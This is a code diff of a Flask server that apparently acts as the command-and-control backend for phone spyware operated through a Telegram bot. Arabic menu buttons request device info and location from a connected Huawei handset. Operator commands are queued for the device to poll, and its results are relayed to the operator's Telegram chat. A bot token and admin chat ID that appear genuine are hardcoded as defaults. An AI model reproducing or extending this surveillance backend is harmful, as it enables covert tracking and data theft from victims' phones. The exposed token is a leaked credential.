@@ -1,19 +1,17 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, send_from_directory
 import requests
 import os
 import threading
 import time
 import json
 
-app = Flask(__name__)
+app = Flask(__name__, static_folder='.', static_url_path='')
 
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '8175556330:AAGP0GZf10h0H_Fc10NJAbKJpP-zOH0xFwM')
 ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID', '658962728')
 
-# قائمة الأوامر المعلقة
 pending_commands = []
 
-# الأزرار العربية الرئيسية
 MAIN_BUTTONS = [
     [{"text": "📱 معلومات الجهاز", "callback_data": "/device_info"},
      {"text": "📍 الموقع", "callback_data": "/location"}],
@@ -36,160 +34,99 @@ MAIN_BUTTONS = [
 ]
 
 def send_telegram_message(chat_id, text, reply_markup=None):
-    """إرسال رسالة مع أزرار"""
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {
-        "chat_id": chat_id,
-        "text": text,
-        "parse_mode": "HTML",
-        "disable_web_page_preview": True
-    }
+    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
     if reply_markup:
         payload["reply_markup"] = json.dumps(reply_markup)
-    
     try:
         requests.post(url, json=payload, timeout=10)
     except Exception as e:
-        print(f"خطأ في إرسال الرسالة: {e}")
+        print(f"خطأ: {e}")
 
 def show_main_menu(chat_id):
-    """عرض القائمة الرئيسية"""
     reply_markup = {"inline_keyboard": MAIN_BUTTONS}
-    message = """
-🤖 <b>لوحة التحكم الرئيسية</b>
-
-📱 <b>الجهاز:</b> HUAWEI BKK-LX2
-🟢 <b>الحالة:</b> متصل
-
-⬇️ <b>اختر أمراً من الأزرار أدناه:</b>
-"""
+    message = "🤖 <b>لوحة التحكم الرئيسية</b>\n\n📱 <b>الجهاز:</b> HUAWEI BKK-LX2\n🟢 <b>الحالة:</b> متصل\n\n⬇️ <b>اختر أمراً:</b>"
     send_telegram_message(chat_id, message, reply_markup)
+
+@app.route('/')
+def home():
+    return send_from_directory('.', 'index.html')
 
 @app.route('/send-to-bot', methods=['POST'])
 def send_to_bot():
-    """يستقبل رسائل من التطبيق"""
     try:
         data = request.json
         message_text = data.get('message', 'رسالة بدون نص')
-        
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        payload = {
-            "chat_id": ADMIN_CHAT_ID,
-            "text": f"📱 <b>من التطبيق:</b>\n{message_text}",
-            "parse_mode": "HTML"
-        }
-        
+        payload = {"chat_id": ADMIN_CHAT_ID, "text": f"📱 <b>من التطبيق:</b>\n{message_text}", "parse_mode": "HTML"}
         response = requests.post(url, json=payload)
-        
         if response.status_code == 200:
             return jsonify({"status": "success"})
         else:
             return jsonify({"status": "error"}), 500
-            
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route('/get-commands', methods=['GET'])
 def get_commands():
-    """التطبيق يسأل عن أوامر جديدة"""
     try:
         device_id = request.args.get('device_id', 'all')
         commands = [cmd for cmd in pending_commands]
         pending_commands.clear()
-        
         return jsonify({"commands": commands})
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route('/send-result', methods=['POST'])
 def send_result():
-    """التطبيق يرسل نتيجة الأمر"""
     try:
         data = request.json
         result = data.get('result', 'لا نتيجة')
         command = data.get('command', 'غير محدد')
-        
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        payload = {
-            "chat_id": ADMIN_CHAT_ID,
-            "text": f"✅ <b>نتيجة الأمر:</b> {command}\n\n{result}",
-            "parse_mode": "HTML"
-        }
+        payload = {"chat_id": ADMIN_CHAT_ID, "text": f"✅ <b>نتيجة الأمر:</b> {command}\n\n{result}", "parse_mode": "HTML"}
         requests.post(url, json=payload)
-        
         return jsonify({"status": "success"})
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
 
-@app.route('/')
-def home():
-    return "🟢 الخادم يعمل بنجاح!"
-
-# دالة الاستماع لأوامر البوت
 def listen_to_bot():
-    """تستمع للأوامر من البوت"""
     last_update_id = 0
-    
     while True:
         try:
             url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id + 1}&timeout=30"
             response = requests.get(url, timeout=35)
-            
             if response.status_code == 200:
                 data = response.json()
-                
                 if data.get('ok') and data.get('result'):
                     for update in data['result']:
                         last_update_id = update['update_id']
-                        
-                        # معالجة الأوامر النصية
                         if 'message' in update:
                             message = update['message']
                             chat_id = message['chat']['id']
                             text = message.get('text', '')
-                            
                             if str(chat_id) == str(ADMIN_CHAT_ID):
                                 if text == '/start' or text == 'ابدأ':
                                     show_main_menu(chat_id)
                                 elif text.startswith('/'):
-                                    command = {
-                                        'id': last_update_id,
-                                        'command': text,
-                                        'timestamp': time.time()
-                                    }
+                                    command = {'id': last_update_id, 'command': text, 'timestamp': time.time()}
                                     pending_commands.append(command)
                                     send_telegram_message(chat_id, f"⏳ تم إرسال الأمر: {text}")
-                        
-                        # معالجة ضغط الأزرار
                         elif 'callback_query' in update:
                             callback = update['callback_query']
                             chat_id = callback['message']['chat']['id']
                             data_callback = callback['data']
-                            
                             if str(chat_id) == str(ADMIN_CHAT_ID):
-                                command = {
-                                    'id': last_update_id,
-                                    'command': data_callback,
-                                    'timestamp': time.time()
-                                }
+                                command = {'id': last_update_id, 'command': data_callback, 'timestamp': time.time()}
                                 pending_commands.append(command)
-                                
-                                # تأكيد الاستلام
                                 url_confirm = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
-                                payload_confirm = {
-                                    "callback_query_id": callback['id'],
-                                    "text": f"⏳ جاري تنفيذ: {data_callback}",
-                                    "show_alert": False
-                                }
+                                payload_confirm = {"callback_query_id": callback['id'], "text": f"⏳ جاري تنفيذ: {data_callback}", "show_alert": False}
                                 requests.post(url_confirm, json=payload_confirm)
-                                
-                                # إرسال الأمر للتطبيق
                                 send_telegram_message(chat_id, f"⚙️ <b>جاري التنفيذ:</b>\n{data_callback}\n\n⏳ انتظر النتيجة...")
         except Exception as e:
             print(f"خطأ: {e}")
             time.sleep(5)
 
-# تشغيل المستمع في thread منفصل
 bot_thread = threading.Thread(target=listen_to_bot, daemon=True)
 bot_thread.start()
 
